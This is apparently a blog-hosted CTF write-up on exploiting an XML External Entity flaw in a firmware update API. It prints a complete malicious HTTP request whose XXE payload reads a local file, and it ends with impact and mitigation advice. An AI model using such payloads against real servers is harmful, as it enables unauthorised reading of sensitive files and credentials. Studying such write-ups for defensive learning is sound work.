+++
date = '2025-02-07T22:53:43+01:00'
draft = false
title = 'Jailbreak-CTF'
+++

**CTF Report: Exploiting XXE Vulnerability in Firmware Update Endpoint**

### **1. Overview**
During this Capture The Flag (CTF) challenge, a vulnerability was identified in the firmware update functionality of a web application. The affected endpoint was `/api/update`, which accepted XML input. By exploiting an XML External Entity (XXE) vulnerability, it was possible to read arbitrary files from the server, leading to potential exposure of sensitive information.

### **2. Vulnerable Endpoint**
- **HTTP Method:** `POST`
- **Endpoint:** `/api/update`
- **Host:** `94.237.52.137:31190`
- **Content-Type:** `application/xml`

#### **Legitimate Request Example**
```http
POST /api/update HTTP/1.1
Host: 94.237.52.137:31190
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Content-Type: application/xml

<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
</FirmwareUpdateConfig>
```

- **Response:**
```json
{
  "message": "Firmware version 1.33.7 update initiated."
}
```

### **3. Exploiting the XXE Vulnerability**
By injecting an external entity referencing a local file, it was possible to extract data from the server. The following modified request was used to retrieve the contents of `flag.txt`:

#### **Malicious Request (XXE Payload)**
```http
POST /api/update HTTP/1.1
Host: 94.237.52.137:31190
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Content-Type: application/xml

<!DOCTYPE FirmwareUpdateConfig [
    <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>
```

### **4. Impact**
- The vulnerability allows unauthorized access to sensitive files on the server.
- An attacker could use this technique to read system configuration files, credentials, or other sensitive data.
- Further exploitation might lead to privilege escalation or remote code execution depending on the system configuration.

### **5. Mitigation**
To prevent XXE attacks, the following security measures should be implemented:
- **Disable External Entities:** Configure the XML parser to disallow external entity resolution.
- **Use Whitelisting:** Restrict XML input to predefined schemas.
- **Sanitize User Input:** Validate and sanitize XML input before processing.
- **Employ Web Application Firewalls (WAF):** Detect and block malicious requests.

### **6. Conclusion**
The XXE vulnerability in the firmware update endpoint allowed file disclosure from the server. Proper XML parsing security controls should be enforced to mitigate such risks. This challenge highlights the importance of secure XML handling in web applications.

---
